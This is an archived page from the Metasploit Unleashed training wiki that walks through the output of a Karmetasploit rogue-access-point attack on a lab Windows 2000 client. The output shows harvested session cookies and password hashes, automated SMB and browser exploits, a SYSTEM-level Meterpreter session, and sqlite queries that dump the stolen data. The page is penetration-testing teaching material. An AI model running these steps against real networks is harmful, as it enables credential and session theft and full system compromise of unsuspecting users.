
		<!DOCTYPE html>
		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
		<head>
			<title>Attack Analysis - Metasploit Unleashed</title>
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
			<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
		</head>

		<body>
			<div id="wrapper">
			
				<div id="header">
					<div id="header-content">
						<h1><a style="color:#F0F0F0" href="index.html">Metasploit Unleashed</a></h1>
						<div class="tagline">Mastering the Framework</div>
						<div class="clear"></div>
					</div>
				</div>
				
				<div id="page">
					<div id="right-box">
						
						<div id="controls">
									<ul>
			<li id="ca-nstab-main" class="selected"><a href="Attack_Analysis" title="View the content page [c]" accesskey="c">Page</a></li>
			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Attack_Analysis&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Attack_Analysis&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Attack_Analysis&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
		</ul>
							
							<div class="portlet" id="p-personal">
								<div class="pBody">
								<ul>
																	</ul>
								</div>
							</div>
							
							<div class="search">
									<div id="p-search" class="portlet">
		<div id="searchBody" class="pBody">
			<form action="http://www.offensive-security.com/w/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input type="search" name="search" title="Search Metasploit Unleashed [f]" accesskey="f" id="searchInput" />
				<input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchGoButton" class="searchButton" />&#160;
				<input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton" />
			</form>
		</div>
	</div>
							</div>
							
							<div class="clear"></div>
						</div>
					
						<a id="top"></a>
						
						<div id="content">
							<h1>Attack Analysis</h1>
						
							<div id="siteSub">From Metasploit Unleashed</div>
							<div id="contentSub"></div>
																													<div id="jump-to-nav">Jump to: <a href="Attack_Analysis#column-one">navigation</a>, <a href="Attack_Analysis#searchInput">search</a></div>
														<!-- start content -->
							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Wow! That was a lot of output! Please take some time to read through the output, and try to understand what is happening.
<br />
<br />
Let's break down some of the output a bit here.
<br />
<br />
<pre><span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1284 XID 92 (IN::A ecademy.com)
<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1286 XID 93 (IN::A facebook.com)
<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1286 XID 93 (IN::A facebook.com)
<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1287 XID 94 (IN::A gather.com)
<span style='color:#0000FF;'>[*]</span> DNS 10.0.0.100:1287 XID 94 (IN::A gather.com)</pre>
<br />
Here we see DNS lookups which are occurring. Most of these are initiated by Karmetasploit in attempts to gather information from the client.
<br />
<br />
<pre><span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > gmail.google.com:80 GET /forms.html Windows IE 5.01 cook
ies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8

<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4e FCH6hI1ae23g hwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8</pre>
<br />
Here we can see Karmetasploit collecting cookie information from the client. This could be useful information to use in attacks against the user later on.
<br />
<br />
<pre><span style='color:#0000FF;'>[*]</span> Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0
<span style='color:#0000FF;'>[*]</span> Authenticating to 10.0.0.100 as TARGET\P0WN3D...
<span style='color:#0000FF;'>[*]</span> AUTHENTICATED as TARGET\P0WN3D...
<span style='color:#0000FF;'>[*]</span> Connecting to the ADMIN$ share...
<span style='color:#0000FF;'>[*]</span> Regenerating the payload...
<span style='color:#0000FF;'>[*]</span> Uploading payload...
<span style='color:#0000FF;'>[*]</span> Obtaining a service manager handle...
<span style='color:#0000FF;'>[*]</span> Creating a new service...
<span style='color:#0000FF;'>[*]</span> Closing service handle...
<span style='color:#0000FF;'>[*]</span> Opening service...
<span style='color:#0000FF;'>[*]</span> Starting the service...
<span style='color:#0000FF;'>[*]</span> Transmitting intermediate stager for over-sized stage...(191 bytes)
<span style='color:#0000FF;'>[*]</span> Removing the service...
<span style='color:#0000FF;'>[*]</span> Closing service handle...
<span style='color:#0000FF;'>[*]</span> Deleting UxsjordQ.exe...
<span style='color:#0000FF;'>[*]</span> Sending Access Denied to 10.0.0.100:1362 TARGET\P0WN3D
<span style='color:#0000FF;'>[*]</span> Received 10.0.0.100:1362 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0
<span style='color:#0000FF;'>[*]</span> Sending Access Denied to 10.0.0.100:1362
<span style='color:#0000FF;'>[*]</span> Received 10.0.0.100:1365 TARGET\P0WN3D LMHASH:3cd170ac4f807291a1b90da20bb8eb228cf50aaf5373897d NTHASH:ddb2b9bed56faf557b1a35d3687fc2c8760a5b45f1d1f4cd OS:Windows 2000 2195 LM:Windows 2000 5.0
<span style='color:#0000FF;'>[*]</span> Authenticating to 10.0.0.100 as TARGET\P0WN3D...
<span style='color:#0000FF;'>[*]</span> AUTHENTICATED as TARGET\P0WN3D...
<span style='color:#0000FF;'>[*]</span> Ignoring request from 10.0.0.100, attack already in progress.
<span style='color:#0000FF;'>[*]</span> Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D
<span style='color:#0000FF;'>[*]</span> Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
<span style='color:#0000FF;'>[*]</span> Sending stage (2650 bytes)
<span style='color:#0000FF;'>[*]</span> Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.care2.com:80 GET / Windows IE 5.01 cookies=
<span style='color:#0000FF;'>[*]</span> Sleeping before handling stage...
<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > www.yahoo.com:80 GET / Windows IE 5.01 cookies=
<span style='color:#0000FF;'>[*]</span> HTTP REQUEST 10.0.0.100 > yahoo.com:80 GET / Windows IE 5.01 cookies=
<span style='color:#0000FF;'>[*]</span> Uploading DLL (75787 bytes)...
<span style='color:#0000FF;'>[*]</span> Upload completed.
<span style='color:#0000FF;'>[*]</span> Migrating to lsass.exe...
<span style='color:#0000FF;'>[*]</span> Current server process: rundll32.exe (848)
<span style='color:#0000FF;'>[*]</span> New server process: lsass.exe (232)
<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (10.0.0.1:45017 -> 10.0.0.100:1364)</pre>
<br />
Here is where it gets really interesting! We have obtained the password hashes from the system, which can then be used to identify the actual passwords. This is followed by the creation of a Meterpreter session.
<br />
<br />
Now we have access to the system, lets see what we can do with it.
<br />
<br />
<pre>msf auxiliary(<span style='color:#ff0000;'>http</span>) > <span style='color:#13C16A;'>sessions -i 1</span>
<span style='color:#0000FF;'>[*]</span> Starting interaction with 1...

<u>meterpreter</u> > <span style='color:#13C16A;'>ps</span>

Process list
============

    PID   Name               Path                                                          
    ---   ----               ----                                                          
    144   smss.exe           \SystemRoot\System32\smss.exe                                 
    172   csrss.exe          \??\C:\WINNT\system32\csrss.exe                               
    192   winlogon.exe       \??\C:\WINNT\system32\winlogon.exe                            
    220   services.exe       C:\WINNT\system32\services.exe                                
    232   lsass.exe          C:\WINNT\system32\lsass.exe                                   
    284   firefox.exe        C:\Program Files\Mozilla Firefox\firefox.exe                  
    300   KodakImg.exe       C:\Program Files\Windows NT\Accessories\ImageVueKodakImg.exe 
    396   svchost.exe        C:\WINNT\system32\svchost.exe                                 
    416   spoolsv.exe        C:\WINNT\system32\spoolsv.exe                                 
    452   svchost.exe        C:\WINNT\System32\svchost.exe                                 
    488   regsvc.exe         C:\WINNT\system32\regsvc.exe                                  
    512   MSTask.exe         C:\WINNT\system32\MSTask.exe                                  
    568   VMwareService.exe  C:\Program Files\VMware\VMware Tools\VMwareService.exe        
    632   WinMgmt.exe        C:\WINNT\System32\WBEM\WinMgmt.exe                            
    696   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe        
    760   Explorer.exe       C:\WINNT\Explorer.exe                                         
    832   VMwareTray.exe     C:\Program Files\VMware\VMware Tools\VMwareTray.exe           
    848   rundll32.exe       C:\WINNT\system32\rundll32.exe                                
    860   VMwareUser.exe     C:\Program Files\VMware\VMware Tool\VMwareUser.exe           
    884   RtWLan.exe         C:\Program Files\ASUS WiFi-AP Solo\RtWLan.exe                 
    916   TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe        
    952   SCardSvr.exe       C:\WINNT\System32\SCardSvr.exe                                
    1168  IEXPLORE.EXE       C:\Program Files\Internet Explorer\IEXPLORE.EXE               

<u>meterpreter</u> > <span style='color:#13C16A;'>ipconfig /all</span>

VMware Accelerated AMD PCNet Adapter
Hardware MAC: 00:0c:29:85:81:55
IP Address  : 0.0.0.0
Netmask     : 0.0.0.0



Realtek RTL8187 Wireless LAN USB NIC                                    
Hardware MAC: 00:c0:ca:1a:e7:d4
IP Address  : 10.0.0.100
Netmask     : 255.255.255.0



MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0


<u>meterpreter</u> > <span style='color:#13C16A;'>pwd</span>
C:\WINNT\system32
<u>meterpreter</u> > <span style='color:#13C16A;'>getuid</span>
Server username: NT AUTHORITY\SYSTEM</pre>
<br />
Wonderful. Just like any other vector, our Meterperter session is working just as we expected.
<br />
<br />
However, there can be a lot that happens in Karmetasploit really fast and making use of the output to standard out may not be usable. Let's look at another way to access the logged information. We will interact with the karma.db that is created in your home directory.
<br />
<br />
Lets open it with sqlite, and dump the schema.
<br />
<br />
<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>sqlite3 karma.db</span>
SQLite version 3.5.9
Enter ".help" for instructions
sqlite> .schema
CREATE TABLE hosts (
'id' INTEGER PRIMARY KEY NOT NULL,
'created' TIMESTAMP,
'address' VARCHAR(16) UNIQUE,
'comm' VARCHAR(255),
'name' VARCHAR(255),
'state' VARCHAR(255),
'desc' VARCHAR(1024),
'os_name' VARCHAR(255),
'os_flavor' VARCHAR(255),
'os_sp' VARCHAR(255),
'os_lang' VARCHAR(255),
'arch' VARCHAR(255)
);
CREATE TABLE notes (
'id' INTEGER PRIMARY KEY NOT NULL,
'created' TIMESTAMP,
'host_id' INTEGER,
'ntype' VARCHAR(512),
'data' TEXT
);
CREATE TABLE refs (
'id' INTEGER PRIMARY KEY NOT NULL,
'ref_id' INTEGER,
'created' TIMESTAMP,
'name' VARCHAR(512)
);
CREATE TABLE reports (
'id' INTEGER PRIMARY KEY NOT NULL,
'target_id' INTEGER,
'parent_id' INTEGER,
'entity' VARCHAR(50),
'etype' VARCHAR(50),
'value' BLOB,
'notes' VARCHAR,
'source' VARCHAR,
'created' TIMESTAMP
);
CREATE TABLE requests (
'host' VARCHAR(20),
'port' INTEGER,
'ssl' INTEGER,
'meth' VARCHAR(20),
'path' BLOB,
'headers' BLOB,
'query' BLOB,
'body' BLOB,
'respcode' VARCHAR(5),
'resphead' BLOB,
'response' BLOB,
'created' TIMESTAMP
);
CREATE TABLE services (
'id' INTEGER PRIMARY KEY NOT NULL,
'host_id' INTEGER,
'created' TIMESTAMP,
'port' INTEGER NOT NULL,
'proto' VARCHAR(16) NOT NULL,
'state' VARCHAR(255),
'name' VARCHAR(255),
'desc' VARCHAR(1024)
);
CREATE TABLE targets (
'id' INTEGER PRIMARY KEY NOT NULL,
'host' VARCHAR(20),
'port' INTEGER,
'ssl' INTEGER,
'selected' INTEGER
);
CREATE TABLE vulns (
'id' INTEGER PRIMARY KEY NOT NULL,
'service_id' INTEGER,
'created' TIMESTAMP,
'name' VARCHAR(1024),
'data' TEXT
);
CREATE TABLE vulns_refs (
'ref_id' INTEGER,
'vuln_id' INTEGER
);</pre>
<br />
With the information gained from the schema, let's interact with the data we have gathered. First, we will list all the systems that we logged information from, then afterward, dump all the information we gathered while they were connected.
<br />
<br />
<pre>sqlite> <span style='color:#13C16A;'>select * from hosts;</span>
1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86
sqlite> select * from notes where host_id = 1;
1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma=183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz=183859642.1241334886.1.1.utmccn=(organic)|utmcsr=google|utmctr=firefox|utmcmd=organic
2|2009-05-09 23:47:04|1|http_request|en-us.start2.mozilla.com:80 GET /firefox Windows FF 1.9.0.10
3|2009-05-09 23:47:05|1|http_cookies|adwords.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
4|2009-05-09 23:47:05|1|http_request|adwords.google.com:80 GET /forms.html Windows FF 1.9.0.10
5|2009-05-09 23:47:05|1|http_request|blogger.com:80 GET /forms.html Windows FF 1.9.0.10
6|2009-05-09 23:47:05|1|http_request|care.com:80 GET /forms.html Windows FF 1.9.0.10
7|2009-05-09 23:47:05|1|http_request|0.0.0.0:55550 GET /ads Windows Firefox 3.0.10
8|2009-05-09 23:47:06|1|http_request|careerbuilder.com:80 GET /forms.html Windows FF 1.9.0.10
9|2009-05-09 23:47:06|1|http_request|ecademy.com:80 GET /forms.html Windows FF 1.9.0.10
10|2009-05-09 23:47:06|1|http_cookies|facebook.com datr=1241925583-120e39e88339c0edfd73fab6428ed813209603d31bd9d1dccccf3; ABT=::#b0ad8a8df29cc7bafdf91e67c86d58561st0:1242530384:A#2dd086ca2a46e9e50fff44e0ec48cb811st0:1242530384:B; s_vsn_facebookpoc_1=7269814957402
11|2009-05-09 23:47:06|1|http_request|facebook.com:80 GET /forms.html Windows FF 1.9.0.10
12|2009-05-09 23:47:06|1|http_request|gather.com:80 GET /forms.html Windows FF 1.9.0.10
13|2009-05-09 23:47:06|1|http_request|gmail.com:80 GET /forms.html Windows FF 1.9.0.10
14|2009-05-09 23:47:06|1|http_cookies|gmail.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
15|2009-05-09 23:47:07|1|http_request|gmail.google.com:80 GET /forms.html Windows FF 1.9.0.10
16|2009-05-09 23:47:07|1|http_cookies|google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
17|2009-05-09 23:47:07|1|http_request|google.com:80 GET /forms.html Windows FF 1.9.0.10
18|2009-05-09 23:47:07|1|http_request|linkedin.com:80 GET /forms.html Windows FF 1.9.0.10

101|2009-05-09 23:50:03|1|http_cookies|safebrowsing.clients.google.com PREF=ID=ee60297d21c2a6e5:U=ecaec12d78faa1ba:TM=1241913986:LM=1241926890:GM=1:S=-p5nGxSz_oh1inss; NID=22=Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID=DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
102|2009-05-09 23:50:03|1|http_request|safebrowsing.clients.google.com:80 POST /safebrowsing/downloads Windows FF 1.9.0.10
108|2009-05-10 00:43:29|1|http_cookies|twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
sqlite></pre>
<br />
Very useful. Think of the number of ways this can be utilized.
<br />
<br />
</p>
<hr />
<p><br />































</p>
<div class="Total1"><a href="MSF_Extended_Usage" title="MSF Extended Usage">MSF Extended Usage</a> &gt; <a href="Karmetasploit" title="Karmetasploit">Karmetasploit</a> &gt; Attack Analysis</div>
<p>










































</p>
<div class="Total2"><a href="http://www.offensive-security.com/w/index.php?title=Configuration&amp;action=edit&amp;redlink=1" class="new" title="Configuration (page does not exist)">Configuration</a> &#124; <a href="Karmetasploit_In_Action" title="Karmetasploit In Action">Karmetasploit In Action</a> &#124; <strong class="selflink">Attack Analysis</strong></div>
<p>






















































</p>
<!-- 
NewPP limit report
Preprocessor visited node count: 531/1000000
Preprocessor generated node count: 2741/1000000
Postâ€expand include size: 3654/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 3/40
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:112-0!*!0!*!*!*!* and timestamp 20131123172134 -->
</div><div class="printfooter">
Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Attack_Analysis&amp;oldid=1547">http://www.offensive-security.com/w/index.php?title=Attack_Analysis&amp;oldid=1547</a>"</div>
							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Karmetasploit&amp;action=edit&amp;redlink=1" class="new" title="Category:Karmetasploit (page does not exist)">Karmetasploit</a></li></ul></div></div>							<!-- end content -->
													</div>
						
					</div>
				
					<div id="left-box">
								<ul id="nav">
				<li><a href="Donate" class="root">Donate</a></li>
				<li>
					<a href="Introduction" class="root"><span class="chapter">01</span> Introduction</a>
					<div class="menu two-column">
						<h3>Introduction</h3>
						<ul class="one">
							<li><a href="Metasploit_Architecture">Metasploit Architecture</a>
								<ul class="two small">
									<li><a href="Filesystem_And_Libraries">Filesystem And Libraries</a></li>
									<li><a href="Modules_And_Locations">Modules And Locations</a></li>
									<li><a href="Metasploit_Object_Model">Metasploit Object Model</a></li>
									<li><a href="Mixins_And_Plugins">Mixins And Plugins</a></li>
								</ul>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
					<a href="Requirements" class="root"><span class="chapter">02</span> Requirements</a>
					<div class="menu two-column">
						<h3>Required Materials</h3>
						<ul class="one">
							<li><a href="Metasploitable">Metasploitable</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Metasploit_Fundamentals" class="root"><span class="chapter">03</span>Metasploit Fundamentals</a>
					<div class="menu four-column">
						<h3>Metasploit Fundamentals</h3>
						<ul class="one">
							<li><a href="Msfcli">Msfcli</a></li>
							<li><a href="Msfconsole">Msfconsole</a>
								<ul class="two small">
									<li><a href="Msfconsole_Commands">Msfconsole Commands</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Exploits">Exploits</a>
								<ul class="two">
									<li><a href="Using_Exploits">Using Exploits</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Payloads">Payloads</a>
								<ul class="two small">
									<li><a href="Payload_Types">Payload Types</a></li>
									<li><a href="Generating_Payloads">Generating Payloads</a></li>
								</ul>
								<div class="clear"></div>
							</li>
                                                        <li><a href="Databases">Databases</a>
                                                                <ul class="two small">
                                                                        <li><a href="Using_the_Database">Using the Database</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
							<li><a href="About_Meterpreter">About Meterpreter</a>
								<ul class="two">
									<li><a href="Meterpreter_Basics">Meterpreter Basics</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
				<a href="Information_Gathering" class="root"><span class="chapter">04</span> Information Gathering</a>
					<div class="menu two-column">
						<h3>Information Gathering</h3>
						<ul class="one">
							<li><a href="Port_Scanning">Port Scanning</a></li>
							<li><a href="Hunting_For_MSSQL">Hunting For MSSQL</a></li>
							<li><a href="Service_Identification">Service Identification</a></li>
							<li><a href="Password_Sniffing">Password Sniffing</a>
								<ul class="two">
									<li><a href="Extending_Psnuffle">Extending Psnuffle</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="SNMP_Sweeping">SNMP Sweeping</a></li>
							<li><a href="Writing_Your_Own_Scanner">Writing Your Own Scanner</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Vulnerability_Scanning" class="root"><span class="chapter">05</span> Vulnerability Scanning</a>
					<div class="menu two-column">
						<h3>Vulnerability Scanning</h3>
						<ul class="one">
							<li><a href="SMB_Login_Check">SMB Login Check</a></li>
							<li><a href="VNC_Authentication">VNC Authentication</a></li>
							<li><a href="WMAP_Web_Scanner">WMAP Web Scanner</a></li>
							<li><a href="Working_With_NeXpose">Working With NeXpose</a>
		     		                                <ul class="two small">
                                                                        <li><a href="NeXpose_Via_Msfconsole">NeXpose Via Msfconsole</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							</li>
                                                        <li><a href="Working_With_Nessus">Working With Nessus</a>
								<ul class="two small">
									<li><a href="Nessus_Via_Msfconsole">Nessus Via Msfconsole</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Writing_A_Simple_Fuzzer" class="root"><span class="chapter">06</span> Writing A Simple Fuzzer</a>
					<div class="menu two-column">
						<h3>Writing a Simple Fuzzer</h3>
						<ul class="one">
							<li><a href="Simple_TFTP_Fuzzer">Simple TFTP Fuzzer</a></li>
							<li><a href="Simple_IMAP_Fuzzer">Simple IMAP Fuzzer</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Exploit_Development" class="root"><span class="chapter">07</span> Exploit Development</a>
					<div class="menu two-column">
						<h3>Exploit Development</h3>
						<ul class="one">
							<li><a href="Exploit_Design_Goals">Exploit Design Goals</a></li>
							<li><a href="Exploit_Format">Exploit Format</a></li>
							<li><a href="Exploit_Mixins">Exploit Mixins</a></li>
							<li><a href="Exploit_Targets">Exploit Targets</a></li>
							<li><a href="Exploit_Payloads">Exploit Payloads</a>
								<ul class="two small">
									<li><a href="Msfvenom">Msfvenom</a></li>
									<li><a href="Msfpayload">Msfpayload</a></li>
									<li><a href="Msfencode">Msfencode</a></li>
									<li><a href="Alphanumeric_Shellcode">Alphanumeric Shellcode</a></li>
									<li><a href="Msfrop">Msfrop</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Writing_An_Exploit">Writing An Exploit</a>
								<ul class="two small">
									<li><a href="Getting_A_Shell">Getting A Shell</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Using_The_Egghunter_Mixin">Using The Egghunter Mixin</a>
								<ul class="two small">
									<li><a href="Completing_The_Exploit">Completing The Exploit</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Porting_Exploits">Porting Exploits</a></li>
						</ul>
					</div>
				</li>
                                <li>
                                        <a href="Web_App_Exploit_Dev" class="root"><span class="chapter">08</span> Web App Exploit Dev</a>
                                        <div class="menu two-column">
                                                <h3>Client-side Exploits</h3>
                                                <ul class="one">
                                                        <li><a href="Installing_dotDefender">Installing dotDefender</a></li>
                                                        <li><a href="Analyzing_the_Exploit">Analyzing the Exploit</a></li>
                                                        <li><a href="Skeleton_Creation">Skeleton Creation</a></li>
                                                        <li><a href="Making_A_Log_Entry">Making A Log Entry</a></li>
                                                        <li><a href="Hosting_the_Javascript">Hosting the Javascript</a></li>
                                                        <li><a href="Final_Exploit">Final Exploit</a></li>
                                                </ul>
                                        </div>
                                </li>
				<li>
					<a href="Client_Side_Attacks" class="root"><span class="chapter">09</span> Client Side Attacks</a>
					<div class="menu three-column">
						<h3>Client Side Attacks</h3>
						<ul class="one">
							<li><a href="Binary_Payloads">Binary Payloads</a></li>
							<ul class="two small">
								<li><a href="Binary_Linux_Trojan">Binary Linux Trojan</a></li>
							</ul>
							<div class="clear"></div>
							<li><a href="Client_Side_Exploits">Client Side Exploits</a></li>
							<li><a href="VBScript_Infection_Methods">VBScript Infection Methods</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Post_Exploitation" class="root"><span class="chapter">10</span> MSF Post Exploitation</a>
					<div class="menu two-column">
						<h3>MSF Post Exploitation</h3>
						<ul class="one">
							<li><a href="Privilege_Escalation">Privilege Escalation</a></li>
							<li><a href="PSExec_Pass_The_Hash">PSExec Pass the Hash</a></li>
							<li><a href="Event_Log_Management">Event Log Management</a></li>
							<li><a href="Fun_With_Incognito">Fun with Incognito</a></li>
							<li><a href="Interacting_With_The_Registry">Interacting with the Registry</a>
								<ul class="two small">
									<li><a href="Persistent_Netcat_Backdoor">Persistent Netcat Backdoor</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Enabling_Remote_Desktop">Enabling Remote Desktop</a></li>
							<li><a href="Packet_Sniffing">Packet Sniffing</a></li>
							<li><a href="Pivoting">Pivoting</a></li>
                                                                <ul class="two small">
                                                                        <li><a href="Portfwd">Portfwd</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							<li><a href="TimeStomp">TimeStomp</a></li>
							<li><a href="Screen_Capture">Screen Capture</a></li>
							<li><a href="Searching_For_Content">Searching For Content</a></li>
							<li><a href="John_The_Ripper">John The Ripper</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Meterpreter_Scripting" class="root"><span class="chapter">11</span> Meterpreter Scripting</a>
					<div class="menu two-column">
						<h3>Meterpreter Scripting</h3>
						<ul class="one">
							<li><a href="Existing_Scripts">Existing Scripts</a></li>
							<li><a href="Writing_Meterpreter_Scripts">Writing Meterpreter Scripts</a></li>
							<li><a href="Custom_Scripting">Custom Scripting</a></li>
							<li><a href="Useful_API_Calls">Useful API Calls</a></li>
							<li><a href="Useful_Functions">Useful Functions</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Maintaining_Access" class="root"><span class="chapter">12</span> Maintaining Access</a>
					<div class="menu two-column">
						<h3>Maintaining Access</h3>
						<ul class="one">
							<li><a href="Keylogging">Keylogging</a></li>
							<li><a href="Meterpreter_Backdoor">Meterpreter Backdoor</a></li>
							<li><a href="Persistent_Backdoors">Persistent Backdoors</a></li>
						        <ul class="two small">
								 <li><a href="Netcat_Backdoor">Netcat Backdoor</a></li>
		 						 <li><a href="Meterpreter_Service">Meterpreter Service</a></li>
							</ul>
								 <div class="clear"></div>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Extended_Usage" class="root"><span class="chapter">13</span> MSF Extended Usage</a>
					<div class="menu two-column">
						<h3>MSF Extended Usage</h3>
						<ul class="one">
							<li><a href="PHP_Meterpreter">PHP Meterpreter</a></li>
							<li><a href="Backdooring_EXE_Files">Backdooring EXE Files</a></li>
